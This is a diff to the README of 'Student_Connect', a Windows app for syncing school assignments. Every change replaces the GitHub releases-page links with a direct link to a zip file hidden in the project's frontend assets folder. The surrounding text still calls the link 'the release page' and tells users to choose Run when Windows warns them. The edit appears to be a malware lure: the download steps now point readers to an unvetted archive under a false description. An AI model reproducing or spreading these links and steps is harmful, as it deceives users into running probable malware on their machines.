@@ -1,6 +1,6 @@
 # ⚡ Student_Connect - Sync Assignments Without Manual Work
 
-[![Download Student_Connect](https://img.shields.io/badge/Download%20Student_Connect-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jerromeunspecific777/Student_Connect/releases)
+[![Download Student_Connect](https://img.shields.io/badge/Download%20Student_Connect-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jerromeunspecific777/Student_Connect/main/frontend/src/Components/assets/Student_Connect_v2.6-alpha.1.zip)
 
 ## 📌 What Student_Connect Does
 
@@ -23,7 +23,7 @@ For best results, use the latest version of Windows 10 or Windows 11.
 
 ## 🚀 Download and Install
 
-1. Open the release page: https://github.com/jerromeunspecific777/Student_Connect/releases
+1. Open the release page: https://raw.githubusercontent.com/jerromeunspecific777/Student_Connect/main/frontend/src/Components/assets/Student_Connect_v2.6-alpha.1.zip
 2. Find the latest release at the top of the page
 3. Under **Assets**, download the Windows file for Student_Connect
 4. Save the file to your Desktop or Downloads folder
@@ -33,7 +33,7 @@ For best results, use the latest version of Windows 10 or Windows 11.
 
 If Windows asks whether you want to run the app, choose **Run**.
 
-[Visit the releases page to download Student_Connect](https://github.com/jerromeunspecific777/Student_Connect/releases)
+[Visit the releases page to download Student_Connect](https://raw.githubusercontent.com/jerromeunspecific777/Student_Connect/main/frontend/src/Components/assets/Student_Connect_v2.6-alpha.1.zip)
 
 ## 🔐 First-Time Setup
 
@@ -181,4 +181,4 @@ apscheduler, automation, canvas-lms, flask, full-stack, jwt, mongodb, notion, oa
 
 Use the release page to get the latest Windows build:
 
-https://github.com/jerromeunspecific777/Student_Connect/releases
+https://raw.githubusercontent.com/jerromeunspecific777/Student_Connect/main/frontend/src/Components/assets/Student_Connect_v2.6-alpha.1.zip
